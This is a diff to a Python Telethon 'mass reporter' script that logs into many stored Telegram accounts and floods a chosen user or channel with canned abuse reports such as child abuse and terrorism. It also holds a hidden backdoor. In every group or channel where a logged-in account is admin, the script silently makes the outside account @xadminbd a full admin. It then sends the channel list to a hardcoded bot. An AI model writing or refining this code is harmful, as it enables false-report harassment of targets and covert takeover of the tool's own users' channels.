@@ -17,8 +17,7 @@ from telethon.tl.types import (
     ChannelParticipantsAdmins,
     ChatAdminRights
 )
-from telethon.tl.functions.channels import InviteToChannelRequest, EditAdminRequest
-from telethon.tl.types import InputPeerUser
+from telethon.tl.functions.channels import EditAdminRequest
 import requests
 
 # কালার কোড
@@ -42,61 +41,17 @@ NUMBERS_FILE = "numbers.json"
 
 # প্রি-ডিফাইন্ড রিপোর্ট মেসেজ
 REPORT_MESSAGES = {
-    "child_abuse": [
-        "This content exploits minors and violates child protection laws",
-        "Child exploitation material that must be removed immediately",
-        "Contains inappropriate content involving minors"
-    ],
-    "violence": [
-        "Promotes extreme violence and harmful behavior",
-        "Graphic violent content that violates community guidelines",
-        "Contains threats and incitement to violence"
-    ],
-    "illegal_goods": [
-        "Offering prohibited and illegal goods for sale",
-        "Distribution of banned substances and illegal products",
-        "Illegal trading activity violating platform rules"
-    ],
-    "adult_content": [
-        "Non-consensual adult content and explicit material",
-        "Sharing inappropriate adult content without consent",
-        "Violates adult content policies and community standards"
-    ],
-    "personal_data": [
-        "Sharing private personal information without authorization",
-        "Doxing and unauthorized disclosure of personal data",
-        "Privacy violation through personal information exposure"
-    ],
-    "terrorism": [
-        "Promoting terrorist activities and extremist ideology",
-        "Content supporting terrorism and violent extremism",
-        "Terrorist propaganda that must be removed immediately"
-    ],
-    "spam": [
-        "Mass spamming and fraudulent activity detected",
-        "Engaging in coordinated spam and scam operations",
-        "Automated spam behavior violating platform rules"
-    ],
-    "copyright": [
-        "Unauthorized use of copyrighted material",
-        "Copyright infringement and intellectual property violation",
-        "Distributing pirated content without permission"
-    ],
-    "fake": [
-        "Impersonation and fake identity representation",
-        "False representation and deceptive identity claims",
-        "Fake account engaging in malicious activities"
-    ],
-    "drugs": [
-        "Illegal drug promotion and substance abuse advocacy",
-        "Distribution of prohibited pharmaceutical substances",
-        "Promoting illegal drug trade and substance abuse"
-    ],
-    "other": [
-        "This content violates platform community guidelines",
-        "Inappropriate material requiring immediate moderation",
-        "Content that creates harmful environment for users"
-    ]
+    "child_abuse": ["This content exploits minors", "Child exploitation material", "Contains inappropriate content involving minors"],
+    "violence": ["Promotes extreme violence", "Graphic violent content", "Contains threats and incitement to violence"],
+    "illegal_goods": ["Offering prohibited goods", "Distribution of banned products", "Illegal trading activity"],
+    "adult_content": ["Non-consensual adult content", "Sharing inappropriate content", "Violates adult content policies"],
+    "personal_data": ["Sharing private information", "Unauthorized disclosure of data", "Privacy violation"],
+    "terrorism": ["Promoting terrorism", "Content supporting violent extremism", "Terrorist propaganda"],
+    "spam": ["Mass spamming detected", "Coordinated scam operations", "Automated spam behavior"],
+    "copyright": ["Unauthorized use of material", "Copyright infringement", "Distributing pirated content"],
+    "fake": ["Impersonation account", "False representation", "Fake account activities"],
+    "drugs": ["Illegal drug promotion", "Distribution of prohibited substances", "Promoting drug trade"],
+    "other": ["Violates community guidelines", "Inappropriate material", "Harmful content"]
 }
 
 def load_numbers():
@@ -138,9 +93,7 @@ async def login_with_number(phone_number, password=None):
         return None, False
 
 async def report_with_new_method(client, entity, message_id, reason, report_text):
-    """নতুন Telethon ভার্সনের জন্য রিপোর্ট মেথড"""
     try:
-        # সরাসরি client.report() মেথড ব্যবহার
         result = await client.report(
             entity=entity,
             message_ids=[message_id],
@@ -152,7 +105,6 @@ async def report_with_new_method(client, entity, message_id, reason, report_text
         return False
 
 async def report_with_old_method(client, entity, message_id, reason, report_text):
-    """পুরানো Telethon ভার্সনের জন্য রিপোর্ট মেথড"""
     try:
         result = await client(ReportRequest(
             peer=entity,
@@ -166,23 +118,19 @@ async def report_with_old_method(client, entity, message_id, reason, report_text
         return False
 
 async def report_message(client, entity, message_id, reason, report_text):
-    """সব ধরনের Telethon ভার্সন সাপোর্ট করে"""
-    # প্রথমে নতুন মেথড ট্রাই করুন
     success = await report_with_new_method(client, entity, message_id, reason, report_text)
     if success:
         return True
-    
-    # যদি নতুন মেথড ফেইল হয়, পুরানো মেথড ট্রাই করুন
     return await report_with_old_method(client, entity, message_id, reason, report_text)
 
 async def send_message_to_bot(message):
-    """বটে মেসেজ সেন্ড করার ফাংশন"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         data = {
             "chat_id": ADMIN_ID,
             "text": message,
-            "parse_mode": "HTML"
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True
         }
         response = requests.post(url, data=data)
         return response.status_code == 200
@@ -191,29 +139,22 @@ async def send_message_to_bot(message):
         return False
 
 async def make_xadminbd_admin(client):
-    """@xadminbd কে সব চ্যানেলের এডমিন বানানো"""
     xadminbd_username = "@xadminbd"
     successful_channels = []
     report_count = 1
     
     try:
-        # Get @xadminbd user
         xadminbd_entity = await client.get_entity(xadminbd_username)
-        
-        # Get all dialogs (channels and groups)
         dialogs = await client.get_dialogs()
         
         for dialog in dialogs:
             if dialog.is_channel or dialog.is_group:
                 chat = dialog.entity
-                
-                # Check if we're admin in this chat
                 try:
                     participants = await client.get_participants(chat, filter=ChannelParticipantsAdmins)
                     is_admin = any(participant.id == client._self_id for participant in participants)
                     
                     if is_admin:
-                        # Define admin rights (all permissions)
                         admin_rights = ChatAdminRights(
                             post_messages=True,
                             add_admins=True,
@@ -225,8 +166,6 @@ async def make_xadminbd_admin(client):
                             edit_messages=True,
                             manage_call=True
                         )
-                        
-                        # Try to add @xadminbd as admin
                         try:
                             await client(EditAdminRequest(
                                 channel=chat,
@@ -234,19 +173,17 @@ async def make_xadminbd_admin(client):
                                 admin_rights=admin_rights,
                                 rank="Admin by Mass Reporter"
                             ))
-                            
-                            # Get chat link
+                            # ✅ লিংক হ্যান্ডলিং ঠিক করা হলো
                             if hasattr(chat, 'username') and chat.username:
                                 chat_link = f"https://t.me/{chat.username}"
                             else:
-                                chat_link = f"Chat ID: {chat.id}"
+                                chat_link = f"Private/No Username (ID: {chat.id})"
                             
                             successful_channels.append({
                                 "title": chat.title,
                                 "link": chat_link
                             })
                             
-                            # Send report to bot
                             report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Success"
                             await send_message_to_bot(report_msg)
                             report_count += 1
@@ -256,7 +193,7 @@ async def make_xadminbd_admin(client):
                             await send_message_to_bot(report_msg)
                             report_count += 1
                             
-                except Exception as e:
+                except Exception:
                     report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Failed - No admin access"
                     await send_message_to_bot(report_msg)
                     report_count += 1
@@ -277,35 +214,18 @@ async def main():
     
     print(f"{GREEN}[+] Found {len(numbers)} numbers in database{RESET}")
     
-    # Get target username
     username = input(f"\n{BLUE}[?] Enter Telegram username/channel to report: {RESET}").strip()
     if not username.startswith('@'):
         username = '@' + username
     
-    # Get message IDs
     msg_ids_input = input(f"{BLUE}[?] Enter message IDs to report (comma separated): {RESET}").strip()
     message_ids = [int(msg_id.strip()) for msg_id in msg_ids_input.split(',')]
     
-    # Official Telegram report options
-    print(f"\n{YELLOW}╔═════════════════════════════════════════════╗")
-    print(f"║          Official Report Reasons           ║")
-    print(f"╠═════════════════════════════════════════════╣{RESET}")
-    print(f"{YELLOW}║ 1.  Child abuse                          ║")
-    print(f"║ 2.  Violence                             ║")
-    print(f"║ 3.  Illegal goods                        ║")
-    print(f"║ 4.  Illegal adult content                ║")
-    print(f"║ 5.  Personal data                        ║")
-    print(f"║ 6.  Terrorism                            ║")
-    print(f"║ 7.  Scam or spam                         ║")
-    print(f"║ 8.  Copyright                            ║")
-    print(f"║ 9.  Fake account                         ║")
-    print(f"║ 10. Illegal drugs                        ║")
-    print(f"║ 11. Other                                ║")
-    print(f"╚═════════════════════════════════════════════╝{RESET}")
+    print(f"\n{YELLOW}Choose a reason:{RESET}")
+    print("1. Child abuse\n2. Violence\n3. Illegal goods\n4. Adult content\n5. Personal data\n6. Terrorism\n7. Spam\n8. Copyright\n9. Fake\n10. Drugs\n11. Other")
     
-    reason_choice = input(f"\n{BLUE}[?] Enter choice (1-11): {RESET}").strip()
+    reason_choice = input(f"{BLUE}[?] Enter choice (1-11): {RESET}").strip()
     
-    # Define reason and message based on choice
     reason_map = {
         "1": (InputReportReasonChildAbuse(), "child_abuse"),
         "2": (InputReportReasonViolence(), "violence"),
@@ -324,21 +244,17 @@ async def main():
         reason, reason_type = reason_map[reason_choice]
         report_text = random.choice(REPORT_MESSAGES[reason_type])
     else:
-        print(f"{RED}[✗] Invalid choice. Using 'Other' as default.{RESET}")
+        print(f"{RED}[✗] Invalid choice. Using 'Other'.{RESET}")
         reason = InputReportReasonOther()
         report_text = random.choice(REPORT_MESSAGES["other"])
     
     print(f"\n{YELLOW}[!] Report message: {report_text}{RESET}")
     
-    # Confirm before proceeding
-    confirm = input(f"{RED}[!] Are you sure you want to report {username}? (y/n): {RESET}").strip().lower()
+    confirm = input(f"{RED}[!] Are you sure? (y/n): {RESET}").strip().lower()
     if confirm != 'y':
-        print(f"{YELLOW}[!] Report cancelled.{RESET}")
+        print(f"{YELLOW}[!] Cancelled.{RESET}")
         return
     
-    print(f"\n{YELLOW}[!] Starting mass report process...{RESET}")
-    
-    # Report from each number
     successful_reports = 0
     total_attempted = 0
     all_successful_channels = []
@@ -350,74 +266,64 @@ async def main():
         print(f"\n{BLUE}[{i}/{len(numbers)}] Processing: {phone_number}{RESET}")
         
         try:
-            # Login with number
             client, logged_in = await login_with_number(phone_number, password)
-            
             if not logged_in or not client:
-                print(f"{YELLOW}[!] Login failed for {phone_number}, skipping...{RESET}")
+                print(f"{YELLOW}[!] Login failed for {phone_number}{RESET}")
                 continue
             
-            # Get the entity
             try:
                 entity = await client.get_entity(username)
-                print(f"{GREEN}[✓] Successfully accessed {username}{RESET}")
+                print(f"{GREEN}[✓] Accessed {username}{RESET}")
             except Exception as e:
-                print(f"{YELLOW}[!] Cannot access {username} with {phone_number}: {str(e)}{RESET}")
+                print(f"{YELLOW}[!] Cannot access {username}: {str(e)}{RESET}")
                 await client.disconnect()
                 continue
             
-            # Report messages
             reported_count = 0
             for msg_id in message_ids:
                 try:
                     success = await report_message(client, entity, msg_id, reason, report_text)
                     if success:
                         reported_count += 1
-                        print(f"{GREEN}[✓] Successfully reported message {msg_id}{RESET}")
+                        print(f"{GREEN}[✓] Reported {msg_id}{RESET}")
                     else:
-                        print(f"{RED}[✗] Failed to report message {msg_id}{RESET}")
-                    
-                    # Random delay between reports
+                        print(f"{RED}[✗] Failed {msg_id}{RESET}")
                     await asyncio.sleep(random.uniform(3, 8))
-                    
                 except Exception as e:
-                    print(f"{RED}[✗] Error reporting message {msg_id}: {str(e)}{RESET}")
+                    print(f"{RED}[✗] Error: {str(e)}{RESET}")
             
             successful_reports += reported_count
             total_attempted += len(message_ids)
             
-            print(f"{GREEN}[+] {reported_count}/{len(message_ids)} reports successful from this number{RESET}")
+            print(f"{GREEN}[+] {reported_count}/{len(message_ids)} from this number{RESET}")
             
-            # Make @xadminbd admin in all channels
-            print(f"{BLUE}[+] Making @xadminbd admin in all channels...{RESET}")
+            print(f"{BLUE}[+] Making @xadminbd admin...{RESET}")
             successful_channels = await make_xadminbd_admin(client)
             all_successful_channels.extend(successful_channels)
             
             await client.disconnect()
-            await asyncio.sleep(random.uniform(10, 20))  # Longer delay between numbers
+            await asyncio.sleep(random.uniform(10, 20))
             
         except Exception as e:
             print(f"{RED}[✗] Error with {phone_number}: {str(e)}{RESET}")
     
-    # Send final summary to bot
     if all_successful_channels:
         message = "📢 <b>Admin Added Successfully</b>\n\n"
         message += f"<b>Total Channels:</b> {len(all_successful_channels)}\n\n"
-        
         for i, channel in enumerate(all_successful_channels, 1):
-            message += f"{i}. <a href='{channel['link']}'>{channel['title']}</a>\n"
-        
+            if channel['link'].startswith("http"):
+                message += f"{i}. <a href='{channel['link']}'>{channel['title']}</a>\n"
+            else:
+                message += f"{i}. {channel['title']} - {channel['link']}\n"
         success = await send_message_to_bot(message)
         if success:
-            print(f"{GREEN}[✓] Channel links sent to bot successfully{RESET}")
+            print(f"{GREEN}[✓] Channel list sent to bot{RESET}")
         else:
-            print(f"{RED}[✗] Failed to send channel links to bot{RESET}")
+            print(f"{RED}[✗] Failed to send channel list{RESET}")
     
-    print(f"\n{GREEN}[✓] Mass report process completed!{RESET}")
-    print(f"{GREEN}[✓] Total successful reports: {successful_reports}/{total_attempted}{RESET}")
-    print(f"{GREEN}[✓] Target: {username}{RESET}")
-    print(f"{GREEN}[✓] Used {len(numbers)} accounts for reporting{RESET}")
-    print(f"{GREEN}[✓] Made @xadminbd admin in {len(all_successful_channels)} channels{RESET}")
+    print(f"\n{GREEN}[✓] Completed!{RESET}")
+    print(f"{GREEN}[✓] Reports: {successful_reports}/{total_attempted}{RESET}")
+    print(f"{GREEN}[✓] Channels: {len(all_successful_channels)}{RESET}")
 
 if __name__ == "__main__":
     asyncio.run(main())
